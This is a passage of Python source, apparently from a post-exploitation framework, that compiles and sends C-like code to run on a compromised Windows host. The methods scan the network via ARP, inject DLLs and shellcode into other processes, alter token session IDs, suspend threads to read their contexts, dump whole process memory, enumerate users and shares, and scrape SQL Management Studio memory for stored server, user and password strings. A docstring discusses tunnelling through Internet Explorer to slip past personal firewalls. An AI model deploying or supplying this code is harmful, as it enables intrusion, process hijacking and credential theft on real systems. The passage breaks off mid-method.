        vars={}
        logging.info("Network to scan: %s" % network)
        logging.info("Number of ips to scan: %d" % numberofips)
        logging.info("Startip=%8.8x" % startip)

        vars["startip"]=startip
        vars["numberofips"]=numberofips

        code="""
        #import "local", "sendint" as "sendint"
        #import "int", "startip" as "startip"
        #import "int", "numberofips" as "numberofips"
        #import "remote","iphlpapi.dll|SendARP" as "SendARP"
        #import "local", "htonl" as "htonl"
        #import "local", "writeblock2self" as "writeblock2self"
        void main()
        {
          int currentport;
          int sockfd;
          int fd;
          int doneips;
          int currentip;
          char pulMac[8];
          unsigned int ulLen;
          int ret;


          currentip=startip;
          doneips=0;

          while (doneips<numberofips)
          {
               doneips=doneips+1;
               ulLen=6;
               //FOR EACH IP...
                 ret=SendARP(htonl(currentip),0,pulMac,&ulLen);
                 if (ret==0) {
                    sendint(currentip);
                    writeblock2self(pulMac,6);
                 }
               currentip=currentip+1;
          }
         sendint(-1);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        #from sniffer import MACDB
        ip=0
        openhosts=[]
        while ip != -1:
            ip=sint32(self.readint())
            #print "Read new host..."
            if ip != -1:
                host=socket.inet_ntoa(big_order(ip))
                logging.info("Open host=%s"%host)
                frommac=self.readbuf(6)
                #if frommac[:3] in MACDB:
                #    self.log("From MAC=%s (%s)"%(hexprint(frommac),MACDB[frommac[:3]]))
                #else:
                #    self.log("From MAC=%s"%hexprint(frommac))
                openhosts.append((host,frommac))
        self.leave()
        return openhosts


    def injectdll(self, pid, dll_path):
        """
        Uploads and injects the given DLL with path `dll_path' (on the local system)
        to the process with `pid' on the remote node. The DLL entry point is then called.

        This method automatically checks for and uses NtCreateThreadEx when available.
        Otherwise it falls back on CreateRemotethread.

        Returns 0 on failure, result of CreateRemoteThread/NtCreateThreadEx on success.
        """

        new_api = self.create_thread_ex_check()

        vars             = {}
        vars["pid"]      = pid
        vars["dll_path"] = dll_path + '\x00'
        vars["dll_len"]  = len(dll_path) + 1

        vars["func_ptr"] = self.getprocaddress("kernel32.dll|LoadLibraryA")

        code = """
        #import "remote","kernel32.dll|OpenProcess" as "openprocess"
        #import "remote","kernel32.dll|VirtualAllocEx" as "virtualallocex"
        #import "remote","kernel32.dll|WriteProcessMemory" as "writeprocessmemory"
        """

        if new_api:
            # self.log('[+] Using NtCreatreThreadEx')
            code += """
            #import "remote", "ntdll.dll|NtCreateThreadEx" as "NtCreateThreadEx"
            """
        else:
            # self.log('[+] Using CreateRemoteThread')
            code += """
            #import "remote", "kernel32.dll|CreateRemoteThread" as "CreateRemoteThread"
            """

        code += """
        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"

        #import "int", "pid" as "pid"
        #import "int", "dll_len" as "dll_len"
        #import "int", "func_ptr" as "func_ptr"

        #import "string", "dll_path" as "dll_path"

        struct UNKNOWN {
            unsigned long Length;    // ULONG
            unsigned long Unknown1;  // ULONG
            unsigned long Unknown2;  // ULONG
            unsigned long *Unknown3; // PULONG
            unsigned long Unknown4;  // ULONG
            unsigned long Unknown5;  // ULONG
            unsigned long Unknown6;  // ULONG
            unsigned long *Unknown7; // PULONG
            unsigned long Unknown8;  // ULONG
        };

        void main()
        {
            int hProc;
            int ret;
            char *dest;
            int hRemote_Thread;
            long dw0;
            long dw1;
            long hRes;
            struct UNKNOWN Buffer;


            dw0 = 0;
            dw1 = 1;

            hProc = openprocess(0x1F0FFF, 0, pid);
            if (hProc == 0)
            {
                sendint(-1);
                return;
            }

            dest = virtualallocex(hProc, NULL, dll_len, 0x1000, 0x40);
            if (dest == 0)
            {
              sendint(-2);
              return;
            }

            ret = writeprocessmemory(hProc, dest, dll_path, dll_len, 0);
            if (ret == 0)
            {
              sendint(-3);
              return;
            }

            sendint(0);

        """
        if new_api:
            code += """
                memset(&Buffer, 0, 36);

                Buffer.Length   = 36;
                Buffer.Unknown1 = 0x10003;
                Buffer.Unknown2 = 0x8;
                Buffer.Unknown3 = &dw1;
                Buffer.Unknown4 = 0;
                Buffer.Unknown5 = 0x10004;
                Buffer.Unknown6 = 4;
                Buffer.Unknown7 = &dw0;
                Buffer.Unknown8 = 0;

                hRemote_Thread = 0;
                hRes = 0;

                hRes = NtCreateThreadEx(&hRemote_Thread, 0x1FFFFF, 0, hProc, func_ptr, dest, 0, 0, 0, 0, &Buffer);

                if (hRes < 0)
                {
                    ret = 0;
                } else {
                    ret = hRemote_Thread;
                }
            """
        else:
            code += """
                ret = CreateRemoteThread(hProc, 0, 0, func_ptr, dest, 0, 0);
            """

        code += """
            sendint(ret);
            }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        status = sint32(self.readint())
        if status == 0:
            result = self.readint()

        self.leave()

        if status == -1:
            self.log("[EE] Failed to open process. Make sure you have appropriate privileges and the correct PID")
        elif status == -2:
            self.log("[EE] Failed to allocate memory in remote process. Make sure you have appropriate privileges and the correct PID")
        elif status == -3:
            self.log("[EE] Failed to write DLL path to remote process")

        if status < 0:
            return 0

        return result


    def getsessionidfrompid(self,pid=-1):
        vars={}
        code="""
	#import "remote","kernel32.dll|GetCurrentProcessId" as "getcurrentprocessid"
	#import "remote","kernel32.dll|ProcessIdToSessionId" as "processidtosessionid"

        #import "local", "sendint" as "sendint"
        #import "int", "pid" as "pid"
        #import "local", "debug" as "debug"

	void main()
	{
	    int ret;
	    int sessionid;
	    int realpid;
	    //debug();
	    if (pid==-1) {
	        realpid=getcurrentprocessid();
	    } else {
	        realpid=pid;
	    }
	    ret=processidtosessionid(realpid,&sessionid);
	    if (ret==0) {
	        sendint(-1);
		return;
	    }
	    sendint(sessionid);
	    return;
	}
	"""
        vars["pid"]=pid
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        sessionid=sint32(self.readint())
        self.leave()
        return sessionid

    def setsessionid(self,sessionid):
        vars={}
        code="""
	#import "remote","kernel32.dll|GetCurrentProcess" as "getcurrentprocess"
	#import "remote","advapi32.dll|SetTokenInformation" as "settokeninformation"
	#import "remote","advapi32.dll|OpenProcessToken" as "openprocesstoken"
	#import "remote","kernel32.dll|CloseHandle" as "closehandle"

        #import "local", "sendint" as "sendint"
        #import "int", "sessionid" as "sessionid"
        #import "local", "debug" as "debug"

	void main()
	{
	    int ret;
	    int hprocess;
	    int htoken;
	    int newid;
	    hprocess=getcurrentprocess();
	    ret=openprocesstoken(hprocess,0x1a8,&htoken); //0x1a8=TOKEN_ADJUST_SESSIONID|TOKEN_ADJUST_DEFAULT|TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
	    if (ret==0) {
	        sendint(-1);
		return;
	    }
	    newid=sessionid;
	    ret=settokeninformation(htoken,0xc,&newid,4); //0xc=TokenSessionId
	    if (ret==0) {
	        sendint(-2);
		closehandle(htoken);
		return;
	    }
	    closehandle(htoken);
	    sendint(0);
	}
	"""
        vars["sessionid"]=sessionid
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        self.leave()
        return ret

    def injectintopid(self, pid, shellcode, exit_success=False, socket_handle=None):
        """
        Injects 'shellcode' into process with given 'pid' then creates and starts
        a new thread to run it. If 'exit_success' is True then upon successfull
        injection we cleanly terminate the current thread by calling ExitThread.

        This method automatically checks for and uses NtCreateThreadEx when available.
        Otherwise it falls back on CreateRemoteThread.

        Returns 0 on failure, result of CreateRemoteThread/NtCreateThreadEx on success.
        """
        new_api = self.create_thread_ex_check()

        vars = {'PID'       : pid,
                'SHELLCODE' : shellcode,
                'CODESIZE'  : len(shellcode),
                }

        code = """
        #import "remote", "kernel32.dll|OpenProcess" as "OpenProcess"
        #import "remote", "kernel32.dll|VirtualAllocEx" as "VirtualAllocEx"
        #import "remote", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        #import "remote", "kernel32.dll|VirtualFree" as "VirtualFree"
        #import "remote", "kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "remote", "kernel32.dll|ExitThread" as "ExitThread"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"
        """

        if new_api:
            # self.log('[+] Using NtCreatreThreadEx')
            code += """
            #import "remote", "ntdll.dll|NtCreateThreadEx" as "NtCreateThreadEx"
            """
        else:
            # self.log('[+] Using CreateRemoteThread')
            code += """
            #import "remote", "kernel32.dll|CreateRemoteThread" as "CreateRemoteThread"
            """

        if (socket_handle != None) and exit_success:
            vars["SOCKET_HANDLE"] = socket_handle
            code += """
                    #import "int", "SOCKET_HANDLE" as "SOCKET_HANDLE"
                    """

        code += """
        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"

        #import "int",    "PID" as "PID"
        #import "int",    "CODESIZE" as "CODESIZE"
        #import "string", "SHELLCODE" as "SHELLCODE"

        struct UNKNOWN {
            unsigned long Length;    // ULONG
            unsigned long Unknown1;  // ULONG
            unsigned long Unknown2;  // ULONG
            unsigned long *Unknown3; // PULONG
            unsigned long Unknown4;  // ULONG
            unsigned long Unknown5;  // ULONG
            unsigned long Unknown6;  // ULONG
            unsigned long *Unknown7; // PULONG
            unsigned long Unknown8;  // ULONG
        };

        void main()
        {
            int pHandle;
            int address;
            int hRemote_Thread;

            struct UNKNOWN Buffer;
            long dw0;
            long dw1;
            long hRes;
            dw0 = 0;
            dw1 = 0;

            char *source;
            char *threadme;
            int i;
            int rVal;

            // get a handle to the process we want to migrate to
            pHandle = OpenProcess(0x43a, 0, PID);
            if (pHandle == 0)
            {
                sendint(-1);
                return;
            }

            threadme = SHELLCODE;
            source = VirtualAlloc(0, CODESIZE, 0x1000, 0x40);

            if (source == 0)
            {
                sendint(-2);
                return;
            }

            for (i = 0; i < CODESIZE; i = i + 1)
            {
                source[i] = threadme[i];
            }

            address = VirtualAllocEx(pHandle, 0, CODESIZE, 0x1000, 0x40);
            if (address == 0)
            {
                sendint(-3);
                return;
            }

            rVal = WriteProcessMemory(pHandle, address, source, CODESIZE, 0);
            if (rVal == 0)
            {
                sendint(-4);
                sendint(GetLastError());
                return;
            }

            // free kludge memory
            VirtualFree(source, 0, 0x8000);
            sendint(0);
            """

        if new_api:
            code += """
                memset(&Buffer, 0, 36);

                Buffer.Length   = 36;
                Buffer.Unknown1 = 0x10003;
                Buffer.Unknown2 = 0x8;
                Buffer.Unknown3 = &dw1;
                Buffer.Unknown4 = 0;
                Buffer.Unknown5 = 0x10004;
                Buffer.Unknown6 = 4;
                Buffer.Unknown7 = &dw0;
                Buffer.Unknown8 = 0;

                hRemote_Thread  = 0;
                hRes = 0;
                hRes = NtCreateThreadEx(&hRemote_Thread, 0x1FFFFF, 0, pHandle, address, 0, 0, 0, 0, 0, &Buffer);

                if (hRes < 0)
                {
                    rVal = 0;
                } else {
                    rVal = hRemote_Thread;
                }
            """
        else:
            code += """
                rVal = CreateRemoteThread(pHandle, 0, 0, address, 0, 0, 0);
            """

        code += """
            sendint(rVal);
        """

        if exit_success:
            exit_code = """
            if (rVal != 0) {
                CLOSE_ORIG_SOCKET_CODE
                ExitThread(0);
            }
            }
            """
            close_socket_code = ""
            if socket_handle != None:
                vars["SOCKET_HANDLE"] = socket_handle
                close_socket_code = "CloseHandle(SOCKET_HANDLE);"

            exit_code = exit_code.replace("CLOSE_ORIG_SOCKET_CODE", close_socket_code)

            code += exit_code

        else:
            code += """
            }
            """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        status = sint32(self.readint())
        if status == 0:
            result = self.readint()

        self.leave()

        if status == -1:
            self.log('[EE] OpenProcess failed')
        elif status == -2:
            self.log('[EE] VirtualAlloc failed')
        elif status == -3:
            self.log('[EE] VirtualAllocEx failed')
        elif status == -4:
            self.log('[EE] WriteProcessMemory failed')
            error  = sint32(self.readint())
            self.log("[EE] GetLastError: %d" % error)

        if status < 0: return 0
        return result


    def openprocess(self,pid,accessrights=0x43a, inheritable=0):
        vars={}
        code="""
        #import "remote","kernel32.dll|OpenProcess" as "openprocess"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "int", "pid" as "pid"
        #import "int", "inheritable" as "inheritable"
        #import "int", "accessrights" as "accessrights"

        void main()
        {
        int ret;
        ret=openprocess(accessrights,inheritable,pid);
        sendint(ret);
        }
        """
        vars["pid"]=pid
        vars["accessrights"]=accessrights
        vars["inheritable"]=inheritable
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readint()
        self.leave()
        return fd

    def getallthreads(self):
        """
        Returns a list of all threads on the system
        """
        vars={}
        code="""
        #import "remote","kernel32.dll|GetCurrentThreadId" as "GetCurrentThreadId"
        #import "remote","kernel32.dll|OpenThread" as "OpenThread"
        #import "remote","kernel32.dll|CloseHandle" as "CloseHandle"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"

        void main()
        {
        int ret;
        int i;
        int access;
        int athread;
        access=0x1F03FF; //threadallaccess
        ret=GetCurrentThreadId();
        sendint(ret); //first send our thread id
        i=0;
        while (i<0x8000) { //we pick 8000 as a max value for threadids, to be modded later
           athread=OpenThread(access,0,i);
           //returns non-zero on success
           if (athread!=0) {
              sendint(i); //send our thread id to the remote side
              CloseHandle(athread);
              }
           i=i+1;
        }
        sendint(-1); //end our list here
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        threadid=0
        allthreadids=[]
        while threadid!=sint32(-1):
            threadid=sint32(self.readint())
            if threadid!=sint32(-1):
                allthreadids+=[threadid]
        self.leave()
        return allthreadids

    def InternetQueryOption(self,hInternet,option):
        """
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/wceinternet5/html/wce50lrfinternetqueryoption.asp

        Our function returns a buffer or None.

        NOTE: empty string is still a successful result, so you have to do a if RET==None explicit check!

        Get an option from winInet. This is mostly used to find HTTP Proxy servers and the like. What we really need to do
        is convert this to shellcode and inject a shellcode into lsass/IE to bounce MOSDEF connections through.

        To do this we probably want to do:
        GET /win32Mosdef <--configurable
        <send second stage>

        Then open two connections in two different threads, one for sending data, one for recieving data.
        POST and chunked transfer will be really useful here.

        Polling is lame.

        We do it through IE rather than implementing our own HTTP client in shellcode/MOSDEF because authenticating
        to Proxy servers is unfun, and IE is always allowed by Windows personal firewalls.

        """
        vars={}
        code="""
        #import "remote","wininet.dll|InternetQueryOption" as "InternetQueryOption"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "int", "hInternet" as "hInternet"
        #import "int", "option" as "option"
        #import "local", "senddata2self" as "senddata2self"

        void main()
        {
        int ret;
        char buffer[1000];
        int buflen;

        buflen=1000;
        ret=InternetQueryOption(hInternet,option,buffer,&buflen);
        sendint(ret);
        if (ret) { //TRUE on success, FALSE on error. We don't do getlasterror() here.
            senddata2self(buffer,buflen);
            }
        }
        """
        vars["hInternet"]=hInternet
        vars["option"]=option

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret:
            #empty string is still a successful result, so you have to do a if RET==None explicit check!
            buffer=readblock()
        else:
            buffer=None
        self.leave()
        return buffer


    def getallthreadcontexts(self):
        """
        Returns a list of all threads on the system
        along with their contexts
        """
        vars={}
        code="""
        #import "remote","kernel32.dll|GetCurrentThreadId" as "GetCurrentThreadId"
        #import "remote","kernel32.dll|OpenThread" as "OpenThread"
        #import "remote","kernel32.dll|CloseHandle" as "CloseHandle"
        #import "remote","kernel32.dll|SuspendThread" as "SuspendThread"
        #import "remote","kernel32.dll|ResumeThread" as "ResumeThread"
        #import "remote","kernel32.dll|GetThreadContext" as "GetThreadContext"

        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"

        struct FLOATING_SAVE_AREA {
         int   ControlWord;
         int   StatusWord;
         int   TagWord;
         int   ErrorOffset;
         int   ErrorSelector;
         int   DataOffset;
         int   DataSelector;
         char  RegisterArea[80];
         int   Cr0NpxState;
        };

        struct CONTEXT {
         int   ContextFlags;
         int   Dr0;
         int   Dr1;
         int   Dr2;
         int   Dr3;
         int   Dr6;
         int   Dr7;
         struct FLOATING_SAVE_AREA FloatSave; //112 bytes big
         int   SegGs;
         int   SegFs;
         int   SegEs;
         int   SegDs;
         int   Edi;
         int   Esi;
         int   Ebx;
         int   Edx;
         int   Ecx;
         int   Eax;
         int   Ebp;
         int   Eip;
         int   SegCs;
         int   EFlags;
         int   Esp;
         int   SegSs; //23rd int
         char  ExtendedRegisters[512];
         //total size = 512 +23*4 + 112=716
        };

        void main()
        {
        int ret;
        int i;
        int access;
        int athread;
        int mythreadid;
        struct CONTEXT threadcontext;

        access=0x1F03FF; //threadallaccess

        mythreadid=GetCurrentThreadId();
        sendint(mythreadid); //first send our thread id
        i=0;
        //thread 7 is the same as thread 4. The mod 4 this at some point.
        while (i<0x800) { //we pick 800 as a max value for threadids, to be modded later
        //we don't want to suspend our own threadid
         if (i!=mythreadid) {
           athread=OpenThread(access,0,i);
           //returns non-zero on success
           if (athread!=0) {
              sendint(i); //send our thread id to the remote side
              ret=SuspendThread(athread);
              if (ret!=-1) {
                 //thread is suspended
                 //first, get context
                 memset(&threadcontext,0xff,716);
                 ret=GetThreadContext(athread,&threadcontext);
                 if (ret!=0) {
                    //nonzero on success
                    //now, send context
                    //send eip
                    sendint(threadcontext.Ebp);
                    sendint(threadcontext.Esp);
                    sendint(threadcontext.Eip);
                 } else {
                    sendint(0);
                    sendint(0);
                    sendint(0);
                    }
                //now resume the thread
                ResumeThread(athread);
                } else {
                  sendint(0);
                  sendint(0);
                  sendint(0);
                }

              }
              CloseHandle(athread);
              }
           i=i+4;
        }
        sendint(-1); //end our list here
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        threadid=0
        allthreadids=[]
        threadid=self.readint()
        logging.debug("my threadid= %x" % threadid)
        while threadid!=sint32(-1):
            threadid=sint32(self.readint())
            if threadid!=sint32(-1):
                allthreadids+=[threadid]
                ebp=self.readint()
                esp=self.readint()
                eip=self.readint()
                logging.debug("Thread: %8.8x" % threadid)
                logging.debug("EBP=%8.8x" % ebp)
                logging.debug("ESP=%8.8x" % esp)
                logging.debug("EIP=%8.8x" % eip)
        self.leave()
        return allthreadids



    # Work in progress
    def getsqlmanagementstudioconnections(self,pid):
        """
        Gets all of a processes memory. For later use
        we need to optimize this to pass us MD5 hashes
        and then store those locally, and if we don't have them, then ask for
        the entire packet of data.
        """
        vars={}
        code="""
        #import "remote","kernel32.dll|OpenProcess" as "OpenProcess"
        #import "remote","kernel32.dll|ReadProcessMemory" as "ReadProcessMemory"
        #import "remote","kernel32.dll|CloseHandle" as "CloseHandle"


        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "senddata2self" as "senddata2self"
        #import "local", "debug" as "debug"
        #import "int", "pid" as "pid"

        char *memsearch(char *buff1, int size1,  char *buff2, int size2){
            char *cp;
            char *s1;
            char *s2;
            int pos;
            int pos1;
            int pos2;
            pos = 0;
            int continue;

            cp = buff1;

            while (pos < size1)
            {
                s1 = cp;
                s2 = buff2;
                pos1 = 0;
                pos2 = 0;

                // Normally this would be:
                // continue =  !(pos1 < size1 && pos2 < size2 && *s1 == *s2)
                continue = 0;
                if (*s1 == *s2){
                    continue = 1;
                }

                while (continue) {
                    s1 = s1 +1;
                    s2 = s2 +1;
                    pos1 = pos1 + 1;
                    pos2 = pos2 + 1;

                    continue = 0;
                    if (pos1 < size1){
                        if (pos2 < size2){
                            if (*s1 == *s2){
                                continue = 1;
                            }
                        }
                    }
                }

                if (pos2 == size2)
                return cp;
                cp = cp + 1;
                pos = pos + 1;
            }

            return NULL;
        }



        void main()
        {
            int ret;
            int i;
            int access;
            int athread;
            int mythreadid;
            unsigned int mempage;
            int numberofbytesread;
            int buffersize;
            int process;
            char buffer[4096];
            char* position;

            buffersize=4096;
            access=0x1F0FFF; //processallaccess

            //access,inherithandle,pid
            process=OpenProcess(access,0,pid);
            sendint(process);
            if (process==0) {
                return;
            }

            mempage=0;
            while (mempage<0x7fff0000) {
                ret=ReadProcessMemory(process,mempage,buffer,buffersize,&numberofbytesread);
                //nonzero on success
                if (ret) {
                    position = memsearch(buffer, numberofbytesread, "p\0a\0s\0s\0w\0o\0r\0d\0",16);
                    if (position){
                        if (memsearch(position, 255, "A\0p\0p\0l\0i\0c\0a\0t\0i\0o\0n\0 \0N\0a\0m\0e\0",32)){
                            sendint(mempage);
                            senddata2self(buffer,numberofbytesread);
                        }
                    }
                }

                mempage=mempage+buffersize;
            }
            CloseHandle(process);
            sendint(-1); //end our list here
        }
        """

        self.clearfunctioncache()
        vars["pid"]=pid
        request=self.compile(code,vars)
        self.sendrequest(request)
        mempage=0
        credentials=[]
        processhandle=self.readint()
        logging.debug("my processhandle= %x" % processhandle)
        if processhandle:
            while mempage!=-1:
                mempage=sint32(self.readint())
                #print "Address: %8.8x"%mempage

                if mempage!=-1:
                    memdata=self.readblock()

                    logging.debug("Address: %8.8x" % mempage)
                    logging.debug("Datalength: %d" % len(memdata))

                    pattern="s\0e\0r\0v\0e\0r\0=\0([^;.]+);\0u\0i\0d\0=\0([^;.]+);\0p\0a\0s\0s\0w\0o\0r\0d\0=\0([^;.]+);"
                    #pattern="s\0e\0r\0v\0e\0r\0=\0(.+);\0u\0i\0d\0=\0(.+);\0p\0a\0s\0s\0w\0o\0r\0d\0=\0(.+);\0A\0p\0p\0l\0i\0c\0a\0t\0i\0o\0n\0 \0N\0a\0m\0e\0=\0(.+);"
                    res = re.findall(pattern, memdata, re.UNICODE)
                    if len(res) == 1:
                        #print "Server=", res[0][0], ", uid=" , res[0][1], ", password=", res[0][2], ", other=", res[0][3], "\n"
                        #credentials+=[(res[0][0], res[0][1], res[0][2], res[0][3])]
                        credentials+=[(res[0][0], res[0][1], res[0][2])]

        else:
            end=self.readint()

        self.leave()
        return credentials



    def getallprocessmemory(self,pid):
        """
        Gets all of a processes memory. For later use
        we need to optimize this to pass us MD5 hashes
        and then store those locally, and if we don't have them, then ask for
        the entire packet of data.
        """
        vars={}
        code="""
        #import "remote","kernel32.dll|OpenProcess" as "OpenProcess"
        #import "remote","kernel32.dll|ReadProcessMemory" as "ReadProcessMemory"
        #import "remote","kernel32.dll|CloseHandle" as "CloseHandle"


        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "senddata2self" as "senddata2self"
        #import "local", "debug" as "debug"
        #import "int", "pid" as "pid"

        void main()
        {
        int ret;
        int i;
        int access;
        int athread;
        int mythreadid;
        unsigned int mempage;
        int numberofbytesread;
        int buffersize;
        int process;
        char buffer[1024];

        buffersize=1024;
        access=0x1F0FFF; //processallaccess

        //access,inherithandle,pid
        process=OpenProcess(access,0,pid);
        sendint(process);
        if (process==0) {
          return;
        }

        mempage=0;
        while (mempage<0x7fff0000) {
         ret=ReadProcessMemory(process,mempage,buffer,buffersize,&numberofbytesread);
         //nonzero on success
         if (ret) {
            sendint(mempage);
            senddata2self(buffer,numberofbytesread);
         }

         mempage=mempage+buffersize;
        }
        CloseHandle(process);
        sendint(-1); //end our list here
        }
        """

        self.clearfunctioncache()
        vars["pid"]=pid
        request=self.compile(code,vars)
        self.sendrequest(request)
        mempage=0
        allprocessdata=[]
        processhandle=self.readint()
        logging.debug("my processhandle= %x" % processhandle)
        if processhandle:
            while mempage!=-1:
                mempage=sint32(self.readint())
                #print "Address: %8.8x"%mempage

                if mempage!=-1:
                    memdata=self.readblock()
                    allprocessdata+=[(mempage,memdata)]

                    logging.debug("Address: %8.8x" % mempage)
                    logging.debug("Datalength: %d" % len(memdata))
        else:
            end=self.readint()

        self.leave()
        return allprocessdata

    def openprocesstoken(self,phandle=None,accessrights=None):
        """
        phandle is a handle to a process, we will return the primary token of that process
        """
        if phandle==None:
            phandle=self.GetCurrentProcess()

        if accessrights==None:
            accessrights=TOKEN_DUPLICATE

        vars={}
        code="""
        #import "remote","advapi32.dll|OpenProcessToken" as "openprocesstoken"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "int", "pid" as "pid"
        #import "int", "accessrights" as "accessrights"

        void main()
        {
        int hToken;
        int ret;

        //debug();
        ret=openprocesstoken(pid,accessrights,&hToken);
        if (ret==0) {
          sendint(-1);
          return;
        }
        //else
        sendint(hToken);

        }
        """
        vars["pid"]=phandle
        vars["accessrights"]=accessrights
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=sint32(self.readint())
        self.leave()
        return fd


    def lookupprivilegevalue(self,privname):
        #these nutty things are actually per-system, not global
        vars={}
        code="""
        #import "remote","advapi32.dll|LookupPrivilegeValueA" as "lookupprivvalue"

        #import "local", "senddata2self" as "senddata2self"
        #import "local", "debug" as "debug"
        #import "string", "privname" as "privname"

        void main()
        {
        int ret;
        unsigned char luid[8];
        //debug();
        ret=lookupprivvalue(0,privname,&luid);
        if (ret==0) {
          senddata2self(luid,0);
          return;
        }
        //else
        senddata2self(luid,8);
        }
        """
        vars["privname"]=privname

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readblock()
        self.leave()
        return fd


    def NetUserEnum(self,server=None):
        """
        Enumerate users on local machine
        """
        vars={}
        code="""
        #import "remote","netapi32.dll|NetUserEnum" as "NetUserEnum"
        #import "remote","netapi32.dll|NetApiBufferFree" as "NetApiBufferFree"
        #import "local", "sendint" as "sendint"
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendunistring2self" as "sendunistring2self"
        #import "local", "debug" as "debug"

        struct USER_INFO_0 {
           short * username;
        };

        void main()
        {
        int ret;
        int done;
        struct USER_INFO_0 *ui0;
        struct USER_INFO_0 *ui0p;
        char ** buffer;
        short * servername;
        int resume_handle;
        int level;
        int prefmaxlength;
        int entries;
        int totalentries;
        int filter;
        int i; //loop variable

        filter=2; //FILTER_NORMAL_ACCOUNT
        prefmaxlength=4096;
        servername=0; // a null pointer means localhost
        level=0; //USER_INFO_0
        done=0; //we're not done yet
        resume_handle=0;
        buffer=&ui0;
        while (done==0) {
        //debug();
           ret=NetUserEnum(servername,level,filter,buffer,prefmaxlength,&entries,&totalentries,&resume_handle);
           sendint(ret); // ERROR_ACCESS_DENIED on failure
           //#define ERROR_MORE_DATA 234
           if (ret!=0 && ret != 234 ) {
           // some kind of error
              done=1;
           } else {
             sendint(entries);
             for (i=0; i<entries; i=i+1) {
                  ui0p=ui0+i;
                  sendunistring2self(ui0p->username);
             } //for loop
           } //else
           if (resume_handle==0) {
              done=1;
           } //if resume_handle
           NetApiBufferFree(ui0);
        } //while done==0
        sendint(-1); //done
        } //main
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        #print "ret=%s"%ret
        usernames=[]
        while ret in [0,234]:
            entries=sint32(self.readint())
            #print "entries=%s"%entries
            for i in range(0,entries):
                newuser=self.readblock()
                usernames+=[newuser]
                #print "newuser=%s"%prettyprint(newuser)
            ret=sint32(self.readint())
        self.leave()
        return usernames

    def NetShareEnum(self,server=None):
        """
        Enumerate shares on local machine
        """
        vars={}
        vars["servername"]=server
        code="""
        #import "remote","netapi32.dll|NetShareEnum" as "NetShareEnum"
        #import "remote","netapi32.dll|NetApiBufferFree" as "NetApiBufferFree"
        #import "local", "sendint" as "sendint"
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendunistring2self" as "sendunistring2self"
        #import "local", "debug" as "debug"

        //will be Null if None is passed in
        #import "string", "servername" as "servername"

        struct SHARE_INFO_2 {
        char * shi2_netname; //wide char
        int shi2_type;
        char * shi2_remark; //wide char
        int shi2_permissions;
        int shi2_max_uses;
        int shi2_current_uses;
        char * shi2_path; //path in wide char
        char * shi2_passwd; //password in wide char
        } ;

        void main()
        {
        int i;
        int ret;
        int done;
        int resume_handle;
        int entries; //entries read in
        int totalentries; //total entries that can be read in
        struct SHARE_INFO_2 *si2; //array of share infoz
        struct SHARE_INFO_2 *si2p; //pointer to the one we use

        done=0;
        resume_handle=0;
        while (done==0) {
        //debug();
           ret=NetShareEnum(servername,2,&si2,50000,&entries,&totalentries,&resume_handle);
           sendint(ret); // ERROR_ACCESS_DENIED on failure
           //#define ERROR_MORE_DATA 234
           if (ret!=0 && ret != 234 ) {
           // some kind of error
              done=1;
           } else {
             sendint(entries);
             for (i=0; i<entries; i=i+1) {
                  si2p=si2+i;
                  sendunistring2self(si2p->shi2_netname);
                  sendint(si2p->shi2_type);
                  sendunistring2self(si2p->shi2_remark);
                  sendunistring2self(si2p->shi2_path);
                  //sendunistring2self(si2p->shi2_passwd);
             } //for loop
           } //else
           if (resume_handle==0) {
              done=1;
           } //if resume_handle
           NetApiBufferFree(si2);
        } //while done==0
        sendint(-1); //done
        } //main
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        devlog("NetShareEnum","ret=%s"%ret)
        shares=[]
        while ret in [0,234]:
            entries=sint32(self.readint())
            devlog("NetShareEnum", "entries=%s"%entries)
            for i in range(0,entries):
                newshare=self.readblock()
                sharetype=self.readint()
                shareremark=self.readblock()
                sharepath=self.readblock()
                sharepassword=""
                #sharepassword=self.readblock()
                shares+=[(newshare,sharetype,shareremark,sharepath,sharepassword)]
                devlog("NetShareEnum","newshare=%s"%prettyprint(newshare))
                devlog("NetShareEnum","sharepath=%s"%prettyprint(sharepath))
                devlog("NetShareEnum","sharepasswd=%s"%prettyprint(sharepassword))
                devlog("NetShareEnum","shareremark=%s"%prettyprint(shareremark))
            ret=sint32(self.readint())
        self.leave()
        return shares


    def AdjustTokenPrivs(self,token,luid,attributes):
        #these nutty things are actually per-system, not global
        vars={}
        code="""
